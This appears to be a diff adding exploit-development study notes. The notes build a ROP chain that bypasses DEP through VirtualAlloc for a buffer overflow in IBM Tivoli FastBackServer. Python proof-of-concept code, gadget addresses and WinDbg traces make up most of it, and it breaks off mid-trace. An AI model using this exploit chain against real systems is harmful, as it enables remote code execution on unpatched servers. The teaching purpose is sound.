+   _In_opt_ LPVOID lpAddress,
+   _In_     SIZE_T dwSize,
+   _In_     DWORD  flAllocationType,
+   _In_     DWORD  flProtect
+ );
 ```
 
+Before our ROP chain invokes VirtualAlloc, we need to make sure that all four parameters have been set up correctly.
 
-```nasm
+If the lpAddress parameter points to an address belonging to a previously committed memory page, we will be able to change the protection settings for that memory page using the flProtect parameter.
+This use of VirtualAlloc allows us to achieve the same goal we'd accomplish through the use of VirtualProtect.
 
-```
+As shown in the function prototype, VirtualAlloc requires a parameter (dwSize) for the size of the memory region whose protection properties we are trying to change. However, VirtualAlloc can only change the memory protections on a per-page basis, so as long as our shellcode is less than 0x1000 bytes, we can use any value between 0x01 and 0x1000.
+The two final arguments are predefined enums. flAllocationType must be set to the MEM_COMMIT enum value (numerical value 0x00001000), while flProtect should be set to the PAGE_EXECUTE_READWRITE enum value (numerical value 0x00000040).1 This will allow the memory page to be readable, writable, and executable.
 
+We are going to invoke VirtualAlloc by placing a skeleton of the function call on the stack through the buffer overflow, modifying its address and parameters through ROP, and then return into it. The skeleton should contain the VirtualAlloc address followed by the return address (which should be our shellcode) and the arguments for the function call.
 
-```nasm
+Listing 37 shows an example of the required values for invoking VirtualAlloc with a fictitious stack address of 0x0d2be300 and a fictitious address for VirtualAlloc.
 
 ```
-
+0d2be300 75f5ab90 -> KERNEL32!VirtualAllocStub
+0d2be304 0d2be488 -> Return address (Shellcode on the stack)
+0d2be308 0d2be488 -> lpAddress (Shellcode on the stack)
+0d2be30c 00000001 -> dwSize
+0d2be310 00001000 -> flAllocationType
+0d2be314 00000040 -> flProtect
+```
 
-```nasm
+Note the name VirtualAllocStub, instead of VirtualAlloc listed above. The official API name is VirtualAlloc, but the symbol name for it, inside kernel32.dll, is VirtualAllocStub.
 
-```
+There are a few things to note from the example above.
+1.	We do not know the VirtualAlloc address beforehand.
+2.	We do not know the return address and the lpAddress argument beforehand.
+3.	dwSize, flAllocationType, and flProtect contain NULL bytes.
 
+We can deal with these problems by sending placeholder values in the skeleton. We'll then assemble ROP gadgets that will dynamically fix the dummy values, replacing them with the correct ones.
 
-```nasm
+Let's update our proof of concept (Listing 38), and insert the dummy values as the last part of the offset values preceding EIP. They will be placed on the stack just before the return address and the ROP chain.
 
-```
+```python
+import socket
+import sys
+from struct import pack
 
-```nasm
+# psAgentCommand
+buf = bytearray([0x41]*0xC)
+buf += pack("<i", 0x534)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x500)  # 1st memcpy: size field
+buf += pack("<i", 0x0)    # 2nd memcpy: offset
+buf += pack("<i", 0x100)  # 2nd memcpy: size field
+buf += pack("<i", 0x0)    # 3rd memcpy: offset
+buf += pack("<i", 0x100)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
 
-```
+# psCommandBuffer
+va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
+va += pack("<L", (0x46464646)) # Shellcode Return Address
+va += pack("<L", (0x47474747)) # # dummy Shellcode Address
+va += pack("<L", (0x48484848)) # dummy dwSize 
+va += pack("<L", (0x49494949)) # # dummy flAllocationType 
+va += pack("<L", (0x51515151)) # dummy flProtect 
 
+offset = b"A" * (276 - len(va))
+eip = b"B" * 4
+rop = b"C" * (0x400 - 276 - 4)
 
-```nasm
+formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+va+eip+rop,0,0,0,0)
+buf += formatString
 
+# Checksum
+buf = pack(">i", len(buf)-4) + buf
+...
 ```
-
 
-```nasm
+Once the proof of concept is executed, the network packet will trigger the buffer overflow and position the dummy values exactly before the 0x42424242 DWORD that overwrites EIP. We can verify this by restarting FastBackServer and attaching WinDbg.
 
 ```
-
+(7b4.88c): Access violation - code c0000005 (first chance)
+42424242 ??              ???
+```
 
-```nasm
+`dd esp - 1C`
 
 ```
+0d39e300  45454545 46464646 00000000 48484848
+0d39e310  00000000 51515151 42424242 43434343
+0d39e320  43434343 43434343 43434343 43434343
+0d39e330  43434343 43434343 43434343 43434343
+0d39e340  43434343 43434343 43434343 43434343
+0d39e350  43434343 43434343 43434343 43434343
+0d39e360  43434343 43434343 43434343 43434343
+0d39e370  43434343 43434343 43434343 43434343
+```
 
+The location of the ROP skeleton is correct, but the DWORDs containing `0x47474747` and `0x49494949` were overwritten with null bytes as part of the process to trigger the vulnerability.
 
-```nasm
+This won't impact us since we're going to overwrite them again with ROP. In the next section, we will take the first step in replacing the dummy values with real values.
 
-```
+### Making ROP's Acquaintance
 
+We have to replace six dummy values on the stack before we can invoke VirtualAlloc, so the first step is to gather the stack address of the first dummy value using ROP gadgets.
 
+The easiest way of obtaining a stack address close to the dummy values is to use the value in ESP at the time of the access violation. We cannot modify the ESP register, since it must always point to the next gadget for ROP to function. Instead, we will copy it into a different register.
 
-```nasm
+We'll have to be creative to get a copy of the ESP register. A gadget like "MOV EAX, ESP ; RET" would be ideal, but they typically do not exist as natural opcodes. In this case, we do some searching and find the following gadget.
 
 ```
+0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret
+```
+Listing 40 - Gadget that copies the content of ESP into ESI
 
+Let's examine exactly what this gadget does. First, it will push the content of ESP to the top of the stack. Next, the content of EAX is pushed to the top of the stack, thus moving the value pushed from ESP four bytes farther down the stack.
 
-```nasm
+Next, the POP EDI instruction will pop the value from EAX into EDI and increase the stack pointer by four, effectively making it point to the value originally contained in ESP. Finally, the POP ESI will pop the value from ESP into ESI, performing the copy of the address we need.
+The return instruction will force execution to transfer to the next DWORD on the stack. Since this value is controlled by us through the buffer overflow, we can continue execution with additional gadgets.
 
-```
+When learning about ROP for the first time, it is very important to see it in action to get a better understanding of how it all ties together.
+We'll update the proof of concept by replacing the value in the eip variable to be the address of the gadget we found, as shown in Listing 41.
 
+```python
+...
+# psCommandBuffer
+va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
+va += pack("<L", (0x46464646)) # Shellcode Return Address
+va += pack("<L", (0x47474747)) # dummy Shellcode Address
+va += pack("<L", (0x48484848)) # dummy dwSize 
+va += pack("<L", (0x49494949)) # dummy flAllocationType 
+va += pack("<L", (0x51515151)) # dummy flProtect 
 
-```nasm
+offset = b"A" * (276 - len(va))
+eip = pack("<L", (0x50501110)) # push esp ; push eax ; pop edi; pop esi ; ret
+rop = b"C" * (0x400 - 276 - 4)
 
+formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+va+eip+rop,0,0,0,0)
+buf += formatString
+
+# Checksum
+buf = pack(">i", len(buf)-4) + buf
+...
 ```
 
+Listing 41 - Proof of concept with first gadget address
 
-```nasm
+With the exploit code updated, we restart FastBackServer and attach WinDbg. Before allowing execution to continue, we need to set a breakpoint on the address of the gadget to follow the execution flow, as shown in Listing 42.
 
-```
+`bp 0x50501110`
 
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
 
-```nasm
+`g`
 
 ```
+Breakpoint 0 hit
+eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=061baba8 edi=00669360
+eip=50501110 esp=0d5fe31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CSFTPAV6+0x1110:
+50501110 54              push    esp
+```
 
-```nasm
+`p`
 
 ```
-
+eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=061baba8 edi=00669360
+eip=50501111 esp=0d5fe318 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CSFTPAV6+0x1111:
+50501111 50              push    eax
+```
 
-```nasm
+`dd esp L1`
 
 ```
-
+0d5fe318  0d5fe31c
+```
 
-```nasm
+`p`
 
 ```
-
+eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=061baba8 edi=00669360
+eip=50501112 esp=0d5fe314 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CSFTPAV6+0x1112:
+50501112 5f              pop     edi
+```
 
-```nasm
+`dd esp L2`
 
 ```
-
+0d5fe314  00000000 0d5fe31c
+```
 
-```nasm
+`p`
 
+```
+eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=061baba8 edi=00000000
+eip=50501113 esp=0d5fe318 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CSFTPAV6+0x1113:
+50501113 5e              pop     esi
 ```
 
+`dd esp L1`
 
+```
+0d5fe318  0d5fe31c
+```
 
-```nasm
+`p`
 
 ```
-
+eax=00000000 ebx=061baba8 ecx=0d5fca70 edx=77071670 esi=0d5fe31c edi=00000000
+eip=50501114 esp=0d5fe31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CSFTPAV6+0x1114:
+50501114 c3              ret
+```
 
-```nasm
+`dd esp L1`
 
 ```
+0d5fe31c  43434343
+```
 
+We hit the breakpoint, and then, when we single-step through the first four instructions, the value in ESP is pushed to the stack and subsequently popped into ESI, as expected.
 
-```nasm
+Additionally, when we reach the return instruction, the uppermost DWORD on the stack is the first of our 0x43434343 values. This will allow us to continue using more gadgets, linking them together in a ROP chain.
+At this point, we have found, implemented, and executed our very first ROP gadget. We are well on the way to creating an exploit that will bypass DEP. It is critical to have a firm understanding of the concept of ROP, so this section should be reviewed until the concepts are well-understood before moving forward.
 
-```
+### Obtaining VirtualAlloc Address
 
+We previously determined that we must get the address of VirtualAlloc while the exploit is running. One possible way to do that is to gather its address from the Import Address Table (IAT) of the CSFTPAV6 module.
+The IAT is a special table containing the addresses of all APIs that are imported by a module. It is populated when the DLL is loaded into the process. We cannot influence which APIs the target process imports, but we can locate and use the existing ones.
 
-```nasm
+With the help of IDA Pro, we can verify that VirtualAlloc is a function imported from CSFTPAV6.dll by checking the Imports tab as shown below:
+ 
+Figure 8: Grabbing VirtualAlloc address from the IAT
 
-```
+The address of VirtualAlloc will change on reboot, but the address (0x5054A220) of the IAT entry that contains it does not change. This means that we can use the IAT entry along with a memory dereference to fetch the address of VirtualAlloc at runtime. We'll do this as part of our ROP chain.
 
+With a way to resolve the address of VirtualAlloc, we must understand how to use it. In the previous step, we placed a dummy value (0x45454545) on the stack for this API address as part of our buffer overflow, which we need to overwrite.
 
-```nasm
+To do this overwrite, we will need to perform three tasks with our ROP gadgets. First, locate the address on the stack where the dummy DWORD is. Second, we need to resolve the address of VirtualAlloc. Finally, we need to write that value on top of the placeholder value.
+We are going to need multiple gadgets for each of these tasks. Let's solve each one of them in order.
+For the first part, Listing 43 illustrates what the stack layout is like when the buffer overflow occurs.
 
+```
+(7b4.88c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=05e8c638 ecx=0d39ca70 edx=77071670 esi=05e8c638 edi=00669360
+eip=42424242 esp=0d39e31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+42424242 ??              ???
 ```
 
-```nasm
+`dd esp - 1C`
 
 ```
+0d39e300  45454545 46464646 00000000 48484848
+0d39e310  00000000 51515151 42424242 43434343
+0d39e320  43434343 43434343 43434343 43434343
+0d39e330  43434343 43434343 43434343 43434343
+0d39e340  43434343 43434343 43434343 43434343
+0d39e350  43434343 43434343 43434343 43434343
+0d39e360  43434343 43434343 43434343 43434343
+0d39e370  43434343 43434343 43434343 43434343
+```
 
+Listing 43 - Stack layout when triggering buffer overflow
 
-```nasm
+The dummy value 0x45454545, which represents the location of the VirtualAlloc address, is at a negative offset of 0x1C from ESP.
 
-```
+Ideally, since we have a copy of the ESP value in ESI, we would like to locate a gadget similar to the following.
 
+SUB ESI, 0x1C
+RETN
 
-```nasm
+Listing 44 - Ideal gadget to obtain VirtualAlloc stack absolute address
 
-```
+Sadly, we couldn't find this gadget or a similar one in CSFTPAV6. We'll need to be a bit more creative.
 
+We could put the 0x1C value on the stack as part of our overflowing buffer and then pop that value into another register of our choice using a gadget. This would allow us to subtract the two registers and get the desired address.
 
-```nasm
+The problem with this approach is that the 0x1C value is really 0x0000001C, which has NULL bytes in it.
 
-```
+We can get around the problem by adding -0x1C rather than subtracting 0x1C. The reason this works is because the CPU represents -0x1C as a very large value, as shown in Listing 45.
 
+0:078> ? -0x1c
+Evaluate expression: -28 = ffffffe4
 
-```nasm
+Listing 45 - Negative 0x1c does not contain NULL bytes
 
-```
+Now the first part of our game plan is clear. We must put the negative value on the stack, pop it into a register, and then add it to the stack pointer address we stored in ESI.
+
+When using gadgets to perform arithmetic with registers, it is easier to use the EAX and ECX registers than to use ESI. This is due to the number of gadgets available and the usage of the registers in compiled code.
 
+The idea is to have a gadget put a copy of ESI into EAX, then pop the negative value into ECX from the stack. Next, we add ECX to EAX, and finally, copy EAX back into ESI.
 
+Knowing which gadgets to search for and how they can go together is a matter of trial and error combined with experience.
 
-```nasm
+To obtain a copy of ESI in EAX, we can use the gadget "MOV EAX,ESI ; POP ESI; RETN", which does a move operation. Additionally, we can update the rop variable in the proof of concept as shown in Listing 46, so we can put it in action.
 
+```python
+rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+rop += pack("<L", (0x42424242)) # junk
+rop += b"C" * (0x400 - 276 - 4 - len(rop))
 ```
 
+Listing 46 - Gadget to move ESI into EAX
 
-```nasm
+Notice that the gadget contains a POP ESI instruction. This requires us to add a dummy DWORD on the stack for alignment.
 
-```
+To observe the execution of the new gadget, we restart FastBackServer, set a breakpoint on the gadget that copies ESP into ESI, and send the packet:
 
+0:058> bp 0x50501110
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
+0:058> g
+ModLoad: 64640000 6464f000   C:\Windows\SYSTEM32\browcli.dll
+Breakpoint 0 hit
+eax=00000000 ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=05ebb868 edi=00669360
+eip=50501110 esp=0d2ce31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CSFTPAV6+0x1110:
+50501110 54              push    esp
 
-```nasm
+0:001> pt
+eax=00000000 ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=0d2ce31c edi=00000000
+eip=50501114 esp=0d2ce31c ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CSFTPAV6+0x1114:
+50501114 c3              ret
 
-```
+0:001> p
+eax=00000000 ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=0d2ce31c edi=00000000
+eip=5050118e esp=0d2ce320 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CSFTPAV6+0x118e:
+5050118e 8bc6            mov     eax,esi
 
+0:001> p
+eax=0d2ce31c ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=0d2ce31c edi=00000000
+eip=50501190 esp=0d2ce320 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CSFTPAV6+0x1190:
+50501190 5e              pop     esi
 
-```nasm
+0:001> p
+eax=0d2ce31c ebx=05ebb868 ecx=0d2cca70 edx=77071670 esi=42424242 edi=00000000
+eip=50501191 esp=0d2ce324 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CSFTPAV6+0x1191:
+50501191 c3              ret
 
-```
+0:001> dd esp L1
+0d2ce324  43434343
 
+Listing 47 - Executing the MOV EAX, ESI gadget
 
-```nasm
+We let the execution go to the end of the first gadget with the pt command and finish its execution with the p command. Now we have entered the gadget containing the MOV EAX, ESI instruction.
 
-```
+Let's note the starting values of EAX and ESI. After the MOV EAX, ESI instruction, EAX contains the same value, which was our goal.
+The second instruction pops the dummy value (0x42424242) into ESI, and when we reach the RET instruction, we are ready to execute the next ROP gadget.
 
+At this point, EAX contains the original address from ESP. Next, we have to pop the -0x1C value into ECX and add it to EAX.
 
-```nasm
+We can use a "POP ECX" instruction to get the negative value into ECX, followed by a gadget containing an "ADD EAX, ECX" instruction. This will allow us to add -0x1C to EAX as shown in Listing 48.
 
+```python
+rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+rop += pack("<L", (0x42424242)) # junk
+rop += pack("<L", (0x505115a3)) # pop ecx ; ret
+rop += pack("<L", (0xffffffe4)) # -0x1C
+rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
+rop += b"C" * (0x400 - 276 - 4 - len(rop))
 ```
 
+Listing 48 - Adding -0x1C to EAX with ROP
 
-```nasm
+The three lines added in the listing above should accomplish this. Before we execute, we set a breakpoint on address 0x505115a3, directly on the POP ECX gadget.
 
-```
+`bp 0x505115a3`
 
+```
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
+```
 
-```nasm
+`g`
 
 ```
-
+Breakpoint 0 hit
+eax=0d67e31c ebx=0605ab78 ecx=0d67ca70 edx=77071670 esi=42424242 edi=00000000
+eip=505115a3 esp=0d67e328 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CSFTPAV6!FtpUploadFileW+0x705:
+505115a3 59              pop     ecx
+```
 
-```nasm
+`p`
 
+```
+eax=0d67e31c ebx=0605ab78 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000
+eip=505115a4 esp=0d67e32c ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CSFTPAV6!FtpUploadFileW+0x706:
+505115a4 c3              ret
 ```
 
+`p`
 
+```
+eax=0d67e31c ebx=0605ab78 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000
+eip=5051579a esp=0d67e330 ebp=51515151 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CSFTPAV6!FtpUploadFileW+0x48fc:
+5051579a 03c1            add     eax,ecx
+```
 
-```nasm
+`p`
 
 ```
-
+eax=0d67e300 ebx=0605ab78 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000
+eip=5051579c esp=0d67e330 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+CSFTPAV6!FtpUploadFileW+0x48fe:
+5051579c c3              ret
+```
 
-```nasm
+`dd eax L1`
 
 ```
+0d67e300  45454545
+```
+
+Listing 49 - Executing POP ECX and ADD EAX, ECX gadgets
 
+According to the highlighted registers in Listing 49, EAX and ECX are updated and modified exactly as desired. We transition smoothly from the POP ECX gadget to the ADD EAX, ECX gadget through the RET instruction.
 
-```nasm
+In addition, the final part of the listing has the address in EAX pointing to the 0x45454545 dummy value reserved for VirtualAlloc.
+With the correct value in EAX, we need to move that value back to ESI so we can use it in the next stages. We can do this with a gadget containing "PUSH EAX" and "POP ESI" instructions as given in Listing 50.
 
+```python
+rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+rop += pack("<L", (0x42424242)) # junk
+rop += pack("<L", (0x505115a3)) # pop ecx ; ret
+rop += pack("<L", (0xffffffe4)) # -0x1C
+rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
+rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
+rop += b"C" * (0x400 - 276 - 4 - len(rop))
 ```
 
+Listing 50 - Copying EAX into ESI
 
-```nasm
+Once again, we can relaunch FastBackServer and WinDbg and set a breakpoint on the new gadget at `0x50537d5b`.
 
+`bp 0x50537d5b`
+
+```
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
 ```
 
-```nasm
+`g`
 
 ```
+Breakpoint 0 hit
+eax=0d37e300 ebx=05fab318 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000
+eip=50537d5b esp=0d37e334 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+CSFTPAV6!FtpUploadFileW+0x26ebd:
+50537d5b 50              push    eax
+```
 
-```nasm
+`p`
 
 ```
-
+eax=0d37e300 ebx=05fab318 ecx=ffffffe4 edx=77071670 esi=42424242 edi=00000000
+eip=50537d5c esp=0d37e330 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+CSFTPAV6!FtpUploadFileW+0x26ebe:
+50537d5c 5e              pop     esi
+```
 
-```nasm
+`p`
 
 ```
-
+eax=0d37e300 ebx=05fab318 ecx=ffffffe4 edx=77071670 esi=0d37e300 edi=00000000
+eip=50537d5d esp=0d37e334 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+CSFTPAV6!FtpUploadFileW+0x26ebf:
+50537d5d c3              ret
+```
 
-```nasm
+`dd esi L1`
 
+```
+0d37e300  45454545
 ```
 
+Listing 51 - Coping EAX into ESI
 
-```nasm
+After both the push and pop instructions, ESI now has the correct address. The next step is to get the VirtualAlloc address into a register.
 
-```
+We previously found that the IAT address for VirtualAlloc is 0x5054A220, but we know 0x20 is a bad character for our exploit. To solve this, we can increase its address by one and then use a couple of gadgets to decrease it to the original value.
 
+First, we use a POP EAX instruction to fetch the modified IAT address into EAX. Then we'll pop -0x00000001 (or its equivalent, 0xFFFFFFFF) into ECX through a POP ECX instruction. Next, we can reuse the ADD EAX, ECX instruction from the previous gadget to restore the IAT address value.
 
-```nasm
+Finally, we can use a dereference to move the address of VirtualAlloc into EAX through a MOV EAX, DWORD [EAX] instruction. We can see observe gadgets added to the updated ROP chain as shown in Listing 52.
 
+```python
+rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+rop += pack("<L", (0x42424242)) # junk
+rop += pack("<L", (0x505115a3)) # pop ecx ; ret
+rop += pack("<L", (0xffffffe4)) # -0x1C
+rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
+rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
+rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
+rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1
+rop += pack("<L", (0x505115a3)) # pop ecx ; ret
+rop += pack("<L", (0xffffffff)) # -1 into ecx
+rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
+rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret
+rop += b"C" * (0x400 - 276 - 4 - len(rop))
 ```
 
+Listing 52 - Moving VirtualAlloc address into EAX
 
+To reiterate, we pop the IAT address of VirtualAlloc increased by one into EAX and pop 0xFFFFFFFF into ECX. Then we add them together to obtain the real VirtualAlloc IAT address in EAX. Finally, we dereference that into EAX.
 
-```nasm
+Once again, we restart FastBackServer and WinDbg. This time, we set a breakpoint on 0x5053a0f5 to skip directly to the gadget containing the POP EAX instruction.
 
-```
+`bp 0x5053a0f5`
 
+```
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
+```
 
-```nasm
+`g`
 
 ```
-
+Breakpoint 0 hit
+eax=0d37e300 ebx=0603ae60 ecx=ffffffe4 edx=77071670 esi=0d37e300 edi=00000000
+eip=5053a0f5 esp=0d37e338 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+CSFTPAV6!FtpUploadFileW+0x29257:
+5053a0f5 58              pop     eax
+```
 
-```nasm
+`p`
 
 ```
-
+eax=5054a221 ebx=0603ae60 ecx=ffffffe4 edx=77071670 esi=0d37e300 edi=00000000
+eip=5053a0f6 esp=0d37e33c ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+CSFTPAV6!FtpUploadFileW+0x29258:
+5053a0f6 c3              ret
+```
 
-```nasm
+`p`
 
 ```
-
+eax=5054a221 ebx=0603ae60 ecx=ffffffe4 edx=77071670 esi=0d37e300 edi=00000000
+eip=505115a3 esp=0d37e340 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+CSFTPAV6!FtpUploadFileW+0x705:
+505115a3 59              pop     ecx
+```
 
-```nasm
+`p`
 
 ```
+eax=5054a221 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000
+eip=505115a4 esp=0d37e344 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+CSFTPAV6!FtpUploadFileW+0x706:
+505115a4 c3              ret
+```
 
-```nasm
+`p`
 
 ```
+eax=5054a221 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000
+eip=5051579a esp=0d37e348 ebp=51515151 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+CSFTPAV6!FtpUploadFileW+0x48fc:
+5051579a 03c1            add     eax,ecx
 
+0:006> p
+eax=5054a220 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000
+eip=5051579c esp=0d37e348 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
+CSFTPAV6!FtpUploadFileW+0x48fe:
+5051579c c3              ret
+```
 
-```nasm
+`p`
 
 ```
-
+eax=5054a220 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000
+eip=5051f278 esp=0d37e34c ebp=51515151 iopl=0         nv up ei pl nz ac po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
+CSFTPAV6!FtpUploadFileW+0xe3da:
+5051f278 8b00            mov     eax,dword ptr [eax]  ds:0023:5054a220={KERNEL32!VirtualAllocStub (76da38c0)}
+```
 
-```nasm
+`p`
 
 ```
-
+eax=76da38c0 ebx=0603ae60 ecx=ffffffff edx=77071670 esi=0d37e300 edi=00000000
+eip=5051f27a esp=0d37e34c ebp=51515151 iopl=0         nv up ei pl nz ac po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
+CSFTPAV6!FtpUploadFileW+0xe3dc:
+5051f27a c3              ret
+```
 
-```nasm
+`u eax L1`
 
 ```
+KERNEL32!VirtualAllocStub:
+76da38c0 8bff            mov     edi,edi
+```
+
+Listing 53 - Obtaining the address of VirtualAlloc from the IAT
 
+The actions set up by our ROP chain worked out and we have now dynamically obtained the address of VirtualAlloc in EAX. The last step is to overwrite the placeholder value on the stack at the address we have stored in ESI.
 
-```nasm
+We can use an instruction like MOV DWORD [ESI], EAX to write the address in EAX onto the address pointed to by ESI. Our updated ROP chain in Listing 54 reflects this last step.
 
+```python
+rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
+rop += pack("<L", (0x42424242)) # junk
+rop += pack("<L", (0x505115a3)) # pop ecx ; ret
+rop += pack("<L", (0xffffffe4)) # -0x1C
+rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
+rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
+rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
+rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1
+rop += pack("<L", (0x505115a3)) # pop ecx ; ret
+rop += pack("<L", (0xffffffff)) # -1 into ecx
+rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
+rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret
+rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
+rop += b"C" * (0x400 - 276 - 4 - len(rop))
 ```
 
+Listing 54 - Writing address of VirtualAlloc on the stack
 
+As before, we restart FastBackServer and WinDbg and set a breakpoint on the address of our newly added gadget. Now we can send the packet:
 
-```nasm
+`bp 0x5051cbb6`
 
 ```
-
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
+```
 
-```nasm
+`g`
 
 ```
-
+Breakpoint 0 hit
+eax=76da38c0 ebx=0605b070 ecx=ffffffff edx=77071670 esi=0d5fe300 edi=00000000
+eip=5051cbb6 esp=0d5fe350 ebp=51515151 iopl=0         nv up ei pl nz ac po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
+CSFTPAV6!FtpUploadFileW+0xbd18:
+5051cbb6 8906            mov     dword ptr [esi],eax  ds:0023:0d5fe300=45454545
+```
 
-```nasm
+`p`
 
 ```
-
+eax=76da38c0 ebx=0605b070 ecx=ffffffff edx=77071670 esi=0d5fe300 edi=00000000
